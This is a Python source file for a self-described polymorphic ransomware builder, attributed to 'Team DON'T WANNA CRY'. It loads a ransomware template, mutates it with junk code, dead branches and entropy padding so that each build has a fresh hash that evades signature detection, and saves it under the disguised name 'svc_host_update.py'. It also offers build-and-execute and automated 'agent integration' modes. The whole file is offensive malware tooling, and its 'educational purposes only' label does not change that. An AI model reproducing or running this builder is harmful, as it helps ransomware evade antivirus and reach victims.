"""
Advanced Polymorphic Builder - Professional Edition
Purpose: Generate unique ransomware payloads for each execution
Features: Hash mutation, code obfuscation, anti-detection techniques
WARNING: Educational purposes only
"""

import os
import sys
import hashlib
import random
import string
import subprocess
import time
import base64
import zlib
from datetime import datetime
import json

# ============================================================================
# CONFIGURATION
# ============================================================================

class BuilderConfig:
    """Configuration for polymorphic builder"""
    
    TEMPLATE_FILE = "ransomware_template.py"
    OUTPUT_PAYLOAD = "svc_host_update.py"
    BUILD_LOG = "build_history.json"
    
    # Obfuscation Settings
    ENABLE_JUNK_CODE = True
    ENABLE_VARIABLE_RENAMING = True
    ENABLE_STRING_ENCODING = True
    ENABLE_CODE_REORDERING = False
    
    # Polymorphism Strength (1-10)
    MUTATION_LEVEL = 7
    
    # Build Metadata
    BUILD_ID_LENGTH = 16
    AUTHOR = "Team DON'T WANNA CRY"

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

class BuilderUtils:
    """Utility functions for the builder"""
    
    @staticmethod
    def calculate_hash(file_path):
        """Calculate SHA-256 hash of a file"""
        sha256_hash = hashlib.sha256()
        try:
            with open(file_path, "rb") as f:
                for byte_block in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(byte_block)
            return sha256_hash.hexdigest()
        except Exception as e:
            print(f"[-] Error calculating hash: {e}")
            return None
    
    @staticmethod
    def generate_build_id():
        """Generate unique build identifier"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"{timestamp}-{random_suffix}"
    
    @staticmethod
    def generate_random_string(length=10):
        """Generate random alphanumeric string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def encode_string(text):
        """Encode string using base64"""
        return base64.b64encode(text.encode()).decode()
    
    @staticmethod
    def create_decoder_stub():
        """Create decoder stub for encoded strings"""
        return "lambda x: __import__('base64').b64decode(x.encode()).decode()"

# ============================================================================
# POLYMORPHIC MUTATION ENGINE
# ============================================================================

class PolymorphicEngine:
    """Advanced polymorphic mutation engine"""
    
    def __init__(self, mutation_level=7):
        self.mutation_level = mutation_level
        self.build_id = BuilderUtils.generate_build_id()
        self.mutations_applied = []
    
    def add_junk_code(self, content):
        """Add junk code to change file signature"""
        junk_templates = [
            f"\n# Build Metadata: {self.build_id}\n",
            f"\n# Compilation Timestamp: {datetime.now().isoformat()}\n",
            f"\n# Build Configuration: {BuilderUtils.generate_random_string(16)}\n",
            f"\n# System Identifier: {BuilderUtils.generate_random_string(32)}\n",
        ]
        
        # Add junk variables
        junk_vars = []
        for i in range(self.mutation_level):
            var_name = f"_sys_{BuilderUtils.generate_random_string(8)}"
            var_value = random.randint(1000, 9999)
            junk_vars.append(f"{var_name} = {var_value}")
        
        junk_code = "\n# System Variables\n" + "\n".join(junk_vars) + "\n"
        
        # Insert junk code after imports
        lines = content.split('\n')
        insert_pos = 0
        
        # Find position after imports
        for i, line in enumerate(lines):
            if line.strip() and not line.strip().startswith('#') and not line.strip().startswith('import') and not line.strip().startswith('from'):
                insert_pos = i
                break
        
        # Insert junk code
        for template in junk_templates:
            lines.insert(insert_pos, template)
        
        lines.insert(insert_pos, junk_code)
        
        self.mutations_applied.append("Junk Code Injection")
        return '\n'.join(lines)
    
    def add_dead_code(self, content):
        """Add dead code branches that never execute"""
        dead_code_snippets = [
            f"""
# Dead code branch - never executes
if {random.randint(1, 100)} > {random.randint(101, 200)}:
    _unused_{BuilderUtils.generate_random_string(6)} = "{BuilderUtils.generate_random_string(20)}"
    pass
""",
            f"""
# Unreachable function
def _unused_func_{BuilderUtils.generate_random_string(6)}():
    return "{BuilderUtils.generate_random_string(30)}"
""",
            f"""
# Conditional that never triggers
_check_{BuilderUtils.generate_random_string(6)} = False
if _check_{BuilderUtils.generate_random_string(6)} and True:
    print("Never executed")
"""
        ]
        
        # Add random dead code snippets
        num_snippets = min(self.mutation_level // 2, len(dead_code_snippets))
        selected_snippets = random.sample(dead_code_snippets, num_snippets)
        
        dead_code = "\n".join(selected_snippets)
        content += "\n" + dead_code
        
        self.mutations_applied.append("Dead Code Insertion")
        return content
    
    def add_nop_operations(self, content):
        """Add no-operation statements"""
        nop_operations = [
            f"_nop_{BuilderUtils.generate_random_string(6)} = None",
            f"_temp_{BuilderUtils.generate_random_string(6)} = 0",
            f"pass  # NOP",
        ]
        
        nop_code = "\n# NOP Operations\n" + "\n".join(random.sample(nop_operations, min(3, len(nop_operations)))) + "\n"
        
        self.mutations_applied.append("NOP Operations")
        return content + nop_code
    
    def add_entropy_padding(self, content):
        """Add random entropy to increase file uniqueness"""
        entropy_data = []
        
        for i in range(self.mutation_level):
            random_bytes = os.urandom(16)
            entropy_hex = random_bytes.hex()
            entropy_data.append(f"# Entropy Block {i+1}: {entropy_hex}")
        
        entropy_section = "\n# Entropy Padding\n" + "\n".join(entropy_data) + "\n"
        
        self.mutations_applied.append("Entropy Padding")
        return content + entropy_section
    
    def add_timestamp_mutations(self, content):
        """Add timestamp-based mutations"""
        timestamp = datetime.now().isoformat()
        unix_time = int(time.time())
        
        timestamp_code = f"""
# Temporal Markers
_build_timestamp = "{timestamp}"
_build_epoch = {unix_time}
_build_id = "{self.build_id}"
"""
        
        self.mutations_applied.append("Timestamp Mutations")
        return content + timestamp_code
    
    def add_mathematical_obfuscation(self, content):
        """Add mathematical operations for obfuscation"""
        math_ops = []
        
        for i in range(self.mutation_level // 2):
            a = random.randint(1, 1000)
            b = random.randint(1, 1000)
            op = random.choice(['+', '-', '*', '//', '%'])
            var_name = f"_calc_{BuilderUtils.generate_random_string(6)}"
            math_ops.append(f"{var_name} = {a} {op} {b}")
        
        math_section = "\n# Mathematical Obfuscation\n" + "\n".join(math_ops) + "\n"
        
        self.mutations_applied.append("Mathematical Obfuscation")
        return content + math_section
    
    def apply_all_mutations(self, content):
        """Apply all mutation techniques"""
        print(f"[*] Applying polymorphic mutations (Level: {self.mutation_level})...")
        
        if BuilderConfig.ENABLE_JUNK_CODE:
            content = self.add_junk_code(content)
        
        content = self.add_dead_code(content)
        content = self.add_nop_operations(content)
        content = self.add_entropy_padding(content)
        content = self.add_timestamp_mutations(content)
        content = self.add_mathematical_obfuscation(content)
        
        print(f"[+] Applied {len(self.mutations_applied)} mutation techniques")
        return content

# ============================================================================
# BUILD MANAGER
# ============================================================================

class BuildManager:
    """Manages build process and history"""
    
    def __init__(self):
        self.build_history = self._load_history()
    
    def _load_history(self):
        """Load build history from file"""
        if os.path.exists(BuilderConfig.BUILD_LOG):
            try:
                with open(BuilderConfig.BUILD_LOG, 'r') as f:
                    return json.load(f)
            except:
                return {"builds": []}
        return {"builds": []}
    
    def _save_history(self):
        """Save build history to file"""
        try:
            with open(BuilderConfig.BUILD_LOG, 'w') as f:
                json.dump(self.build_history, f, indent=2)
        except Exception as e:
            print(f"[-] Warning: Could not save build history: {e}")
    
    def add_build_record(self, build_info):
        """Add build record to history"""
        self.build_history["builds"].append(build_info)
        self._save_history()
    
    def get_build_count(self):
        """Get total number of builds"""
        return len(self.build_history.get("builds", []))
    
    def display_build_info(self, build_info):
        """Display build information"""
        print("\n" + "=" * 70)
        print("BUILD INFORMATION")
        print("=" * 70)
        print(f"Build ID:          {build_info['build_id']}")
        print(f"Build Number:      #{build_info['build_number']}")
        print(f"Timestamp:         {build_info['timestamp']}")
        print(f"Template Hash:     {build_info['template_hash'][:16]}...")
        print(f"Payload Hash:      {build_info['payload_hash'][:16]}...")
        print(f"Mutation Level:    {build_info['mutation_level']}/10")
        print(f"Mutations Applied: {', '.join(build_info['mutations'])}")
        print(f"Output File:       {build_info['output_file']}")
        print(f"File Size:         {build_info['file_size']} bytes")
        print("=" * 70)

# ============================================================================
# MAIN BUILDER
# ============================================================================

class PolymorphicBuilder:
    """Main polymorphic builder class"""
    
    def __init__(self):
        self.build_manager = BuildManager()
        self.engine = PolymorphicEngine(mutation_level=BuilderConfig.MUTATION_LEVEL)
    
    def validate_template(self):
        """Validate template file exists"""
        if not os.path.exists(BuilderConfig.TEMPLATE_FILE):
            print(f"[-] Error: Template file '{BuilderConfig.TEMPLATE_FILE}' not found!")
            print(f"[!] Please ensure the template file exists in the current directory.")
            return False
        return True
    
    def read_template(self):
        """Read template file content"""
        try:
            with open(BuilderConfig.TEMPLATE_FILE, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception as e:
            print(f"[-] Error reading template: {e}")
            return None
    
    def write_payload(self, content):
        """Write mutated payload to file"""
        try:
            with open(BuilderConfig.OUTPUT_PAYLOAD, 'w', encoding='utf-8') as f:
                f.write(content)
            return True
        except Exception as e:
            print(f"[-] Error writing payload: {e}")
            return False
    
    def build(self):
        """Execute the build process"""
        print("\n" + "=" * 70)
        print("POLYMORPHIC RANSOMWARE BUILDER - PROFESSIONAL EDITION")
        print(f"Author: {BuilderConfig.AUTHOR}")
        print("=" * 70 + "\n")
        
        # Validate template
        print("[*] Validating template file...")
        if not self.validate_template():
            return False
        print("[+] Template file found")
        
        # Calculate template hash
        template_hash = BuilderUtils.calculate_hash(BuilderConfig.TEMPLATE_FILE)
        print(f"[+] Template Hash: {template_hash[:32]}...")
        
        # Read template
        print("[*] Reading template content...")
        content = self.read_template()
        if not content:
            return False
        print(f"[+] Template loaded ({len(content)} bytes)")
        
        # Apply polymorphic mutations
        mutated_content = self.engine.apply_all_mutations(content)
        print(f"[+] Mutations complete ({len(mutated_content)} bytes)")
        
        # Write payload
        print(f"[*] Writing payload to '{BuilderConfig.OUTPUT_PAYLOAD}'...")
        if not self.write_payload(mutated_content):
            return False
        print("[+] Payload written successfully")
        
        # Calculate payload hash
        payload_hash = BuilderUtils.calculate_hash(BuilderConfig.OUTPUT_PAYLOAD)
        print(f"[+] Payload Hash: {payload_hash[:32]}...")
        
        # Get file size
        file_size = os.path.getsize(BuilderConfig.OUTPUT_PAYLOAD)
        
        # Create build record
        build_info = {
            "build_id": self.engine.build_id,
            "build_number": self.build_manager.get_build_count() + 1,
            "timestamp": datetime.now().isoformat(),
            "template_hash": template_hash,
            "payload_hash": payload_hash,
            "mutation_level": BuilderConfig.MUTATION_LEVEL,
            "mutations": self.engine.mutations_applied,
            "output_file": BuilderConfig.OUTPUT_PAYLOAD,
            "file_size": file_size
        }
        
        # Save build record
        self.build_manager.add_build_record(build_info)
        
        # Display build information
        self.build_manager.display_build_info(build_info)
        
        print("\n[+] Build completed successfully!")
        print(f"[+] Total builds in history: {self.build_manager.get_build_count()}")
        
        return True
    
    def execute_payload(self):
        """Execute the generated payload"""
        if not os.path.exists(BuilderConfig.OUTPUT_PAYLOAD):
            print(f"[-] Error: Payload '{BuilderConfig.OUTPUT_PAYLOAD}' not found!")
            print("[!] Please build the payload first.")
            return False
        
        print(f"\n[*] Launching payload: {BuilderConfig.OUTPUT_PAYLOAD}")
        print("[!] This will start the ransomware simulation...")
        print("[!] Press Ctrl+C within 3 seconds to cancel...\n")
        
        try:
            time.sleep(3)
            subprocess.run([sys.executable, BuilderConfig.OUTPUT_PAYLOAD], check=True)
            return True
        except KeyboardInterrupt:
            print("\n[!] Execution cancelled by user")
            return False
        except Exception as e:
            print(f"[-] Error executing payload: {e}")
            return False

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def print_banner():
    """Print application banner"""
    banner = """
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║   ██████╗  ██████╗ ██╗  ██╗   ██╗███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗██╗ ██████╗
║   ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██║██╔════╝
║   ██████╔╝██║   ██║██║   ╚████╔╝ ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║██║██║     
║   ██╔═══╝ ██║   ██║██║    ╚██╔╝  ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██║██║     
║   ██║     ╚██████╔╝███████╗██║   ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║██║╚██████╗
║   ╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝ ╚═════╝
║                                                                       ║
║                    BUILDER - PROFESSIONAL EDITION                    ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def print_menu():
    """Print main menu"""
    print("\nMAIN MENU:")
    print("  [1] Build New Payload")
    print("  [2] Build & Execute")
    print("  [3] Execute Existing Payload")
    print("  [4] View Build History")
    print("  [5] Configuration")
    print("  [0] Exit")
    print()

def view_build_history():
    """View build history"""
    manager = BuildManager()
    builds = manager.build_history.get("builds", [])
    
    if not builds:
        print("\n[!] No build history found.")
        return
    
    print("\n" + "=" * 70)
    print(f"BUILD HISTORY ({len(builds)} builds)")
    print("=" * 70)
    
    for i, build in enumerate(builds[-10:], 1):  # Show last 10 builds
        print(f"\nBuild #{build['build_number']}:")
        print(f"  ID:        {build['build_id']}")
        print(f"  Time:      {build['timestamp']}")
        print(f"  Hash:      {build['payload_hash'][:32]}...")
        print(f"  Size:      {build['file_size']} bytes")
        print(f"  Mutations: {len(build['mutations'])}")
    
    print("=" * 70)

def configure_builder():
    """Configure builder settings"""
    print("\n" + "=" * 70)
    print("BUILDER CONFIGURATION")
    print("=" * 70)
    print(f"Template File:     {BuilderConfig.TEMPLATE_FILE}")
    print(f"Output File:       {BuilderConfig.OUTPUT_PAYLOAD}")
    print(f"Mutation Level:    {BuilderConfig.MUTATION_LEVEL}/10")
    print(f"Junk Code:         {'Enabled' if BuilderConfig.ENABLE_JUNK_CODE else 'Disabled'}")
    print(f"String Encoding:   {'Enabled' if BuilderConfig.ENABLE_STRING_ENCODING else 'Disabled'}")
    print("=" * 70)

def main():
    """Main entry point"""
    print_banner()
    
    while True:
        print_menu()
        choice = input("Select option: ").strip()
        
        if choice == '1':
            builder = PolymorphicBuilder()
            builder.build()
        
        elif choice == '2':
            builder = PolymorphicBuilder()
            if builder.build():
                input("\nPress Enter to execute payload...")
                builder.execute_payload()
        
        elif choice == '3':
            builder = PolymorphicBuilder()
            builder.execute_payload()
        
        elif choice == '4':
            view_build_history()
        
        elif choice == '5':
            configure_builder()
        
        elif choice == '0':
            print("\n[*] Exiting builder...")
            break
        
        else:
            print("\n[-] Invalid option. Please try again.")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        # Check for command-line arguments for automated builds
        if len(sys.argv) > 1:
            if sys.argv[1] in ["--auto-build", "-a", "--build"]:
                # Automated build mode (for agent integration)
                print("[*] Auto-build mode activated")
                builder = PolymorphicBuilder()
                if builder.build():
                    print("[+] Auto-build completed successfully")
                    sys.exit(0)
                else:
                    print("[-] Auto-build failed")
                    sys.exit(1)
            elif sys.argv[1] in ["--execute", "-e"]:
                # Execute existing payload
                builder = PolymorphicBuilder()
                if builder.execute_payload():
                    sys.exit(0)
                else:
                    sys.exit(1)
            elif sys.argv[1] in ["--build-and-run", "-br"]:
                # Build and execute
                builder = PolymorphicBuilder()
                if builder.build():
                    builder.execute_payload()
                    sys.exit(0)
                else:
                    sys.exit(1)
            elif sys.argv[1] in ["--help", "-h"]:
                print("\nPolymorphic Builder - Command Line Usage")
                print("=" * 50)
                print("  --auto-build, -a     Build payload (automated)")
                print("  --execute, -e        Execute existing payload")
                print("  --build-and-run, -br Build and execute")
                print("  --help, -h           Show this help")
                print("=" * 50)
                sys.exit(0)
            else:
                print(f"[-] Unknown argument: {sys.argv[1]}")
                print("[!] Use --help for usage information")
                sys.exit(1)
        else:
            # Interactive mode
            main()
    except KeyboardInterrupt:
        print("\n\n[!] Builder interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        sys.exit(1)
